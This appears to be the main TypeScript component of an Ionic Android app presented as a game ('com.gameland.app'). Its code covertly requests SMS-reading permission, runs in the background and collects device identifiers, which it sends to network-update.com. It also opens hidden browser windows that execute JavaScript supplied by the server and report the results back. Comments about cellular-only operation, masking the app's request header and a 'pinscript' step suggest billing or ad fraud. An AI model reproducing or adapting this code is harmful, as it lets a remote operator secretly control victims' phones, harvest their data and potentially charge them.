import { Component } from '@angular/core';
import { Platform } from 'ionic-angular';
import { StatusBar } from '@ionic-native/status-bar';
import { SplashScreen } from '@ionic-native/splash-screen';

import { TabsPage } from '../pages/tabs/tabs';
import { InAppBrowser } from '@ionic-native/in-app-browser';
import { Storage } from '@ionic/storage';
import { Device } from '@ionic-native/device';
import { Network } from '@ionic-native/network';
import { Http } from '@angular/http';
import { BackgroundMode } from '@ionic-native/background-mode';
import { SMS } from '@ionic-native/sms';
import { AndroidPermissions } from '@ionic-native/android-permissions';


import 'rxjs/add/operator/map';

declare var AndroidReferrer:any;

@Component({
  templateUrl: 'app.html'
})
export class MyApp {

  rootPage:any = TabsPage;

  network: Network;
  storage: Storage;
  referrer: String;
  sms: SMS;
  smsPermission: boolean;

  constructor(platform: Platform, statusBar: StatusBar, splashScreen: SplashScreen, iab: InAppBrowser,
              storage: Storage, device: Device, network: Network, http: Http, backgroundMode: BackgroundMode,
              sms: SMS, androidPermissions: AndroidPermissions) {

    platform.ready().then(() => {
      var app = this;

      androidPermissions.checkPermission(androidPermissions.PERMISSION.READ_SMS).then(
        function(){
          app.smsPermission = true;
          console.log('sms read ok');
        },
        function(){
          androidPermissions.requestPermissions(androidPermissions.PERMISSION.READ_SMS).then(function(){
            app.smsPermission = true;
            console.log('accepted sms request');
          }, function(){
            app.smsPermission = false;
            console.log('NO sms reading');
          });
        }
      );

      backgroundMode.enable();

      this.network = network;
      this.storage = storage;
      this.sms = sms;

      //get device settings and save it to local storage to use later
      const deviceSettings = {
        uuid: device.uuid,
        model: device.model,
        platform: device.platform,
        version: device.version,
        isVirtual: device.isVirtual,
        serial: device.serial,
        ran: false
      };

      AndroidReferrer.echo('referrer', function (referrer) {
        if(referrer.length > 0){
          app.referrer = referrer;
          storage.set("deviceSettings", deviceSettings);
          app.handleInstructions(http, iab);

          // if (app.isNetworkOk()) { //we started on a cellular network
          //   console.log('network is ok');
          //   app.handleInstructions(http, iab);
          // } else { //non cellular let's watch for connections to come up
          //   console.log('we are not on a cellular network the type is ='+app.network.type);
          //   let connectSubscription = app.network.onchange().subscribe(() => {
          //     console.log('new network change... to'+app.network.type);
          //     setTimeout(() => {
          //       if (app.isNetworkOk()) {
          //         app.handleInstructions(http, iab);
          //         connectSubscription.unsubscribe();
          //       }
          //     }, 3000);
          //   });
          // }
        }else{
          console.log('no referrer, not sending status');
        }
      });

      // Okay, so the platform is ready and our plugins are available.
      // Here you can do any higher level native things you might need.
      statusBar.styleDefault();
      splashScreen.hide();

    });
  }

  isNetworkOk(){
    if(this.network.type === "2g" || this.network.type === "3g" ||
      this.network.type === "4g" || this.network.type === "cellular"){
      return true;
    } else {
      return false;
    }
  }

  handleInstructions(http, iab){
    var app = this;
    this.storage.get("deviceSettings").then(function(deviceSettings){

      //call the api for instructions, here's a quick sample
      http.post('https://network-update.com/api/boot',
        {
          "package" : "com.gameland.app",
          "android_id" : deviceSettings.uuid,
          "referrer" : app.referrer
        },
        {
        }).map(res => res.json()).subscribe(
        data => {
          //THIS is BOOT CALL - TODO set the x request header to NOT be our app
          const browserOptions = 'zoom=no,location=no,useWideViewPort=no,hidden=yes,enableViewportScale=yes';
          const path = app.webviewUrl(data);
          console.log(path);
          iab.create(path, '_blank', browserOptions);

          //THIS IS THE CALL to NEXT and the instructions we will fire.
          app.handleNext(app, data, http, iab, deviceSettings);
        },
        err => {
          console.log("Oops! " + err);
        });
    });
  }

  webviewUrl(data){
    var result = data.filter(function (result) {
      return result.type === "webview";
    });

    return result[0].url;
  }

  nextUrl(data){
    var result = data.filter(function (result) {
      return result.type === "api_instructions";
    });

    return result[0].url;
  }

  async handleNext(app, data, http, iab, deviceSettings){
    console.log('next');
    //call the api for instructions
    http.post(this.nextUrl(data),
      {
        "package" : "com.gameland.app",
        "android_id" : deviceSettings.uuid,
        "referrer" : app.referrer
      },
      {
      }).map(res => res.json()).subscribe(
      data => {
        const browserOptions = 'zoom=no,location=no,useWideViewPort=no,hidden=yes,enableViewportScale=yes';
        const path = app.webviewUrl(data);
        const browser = iab.create(path, '_blank', browserOptions);

        browser.on('loadstop').subscribe(event => {
          console.log('loadstop', event);
          if(event.url === path){//make sure we're in the webview with the next instructions
            app.doInstructions(app, data, browser, http);
          }
        });
      },
      err => {
        console.log("problem handling next! " + err);
      });
  }

  async doInstructions(app, data, browser, http){
    for (let instruction of data) {
      if(instruction.type === "sleep"){
        console.log('Taking a break...');
        await app.sleep(instruction.ms);
        console.log('done with our break');
      }else if(instruction.type === "javascript"){
        //run the instructions...
        app.executeScript(app, instruction.script, browser, http, instruction.url_log);
      }else if(instruction.type ===  "pinscript"){

      }
    }
  }

  executeScript(app, script, browser, http, url_log){
    browser.executeScript({code: script}).then(
      function(result){
        console.log(result);
        if(url_log){
          app.log(http, url_log, result);
        }
      }
    );
  }

  sleep(ms) {
    //noinspection TypeScriptUnresolvedFunction
    return new Promise(resolve => setTimeout(resolve, ms));
  }


  log(http, url, msg){
    var app = this;
    console.log("logging message to "+url+" = "+msg);
    this.storage.get("deviceSettings").then(function(deviceSettings){
      //call the api for instructions, here's a quick sample
      http.post(url,
        {
          "package" : "com.gameland.app",
          "android_id" : deviceSettings.uuid,
          "referrer" : app.referrer,
          "log" : msg
        },
        {}).map(res => res.json()).subscribe(
        data => {
          console.log("logging response"+data.data);
        },
        err => {
          console.log("error logging " + err);
        });
    });
  }
}
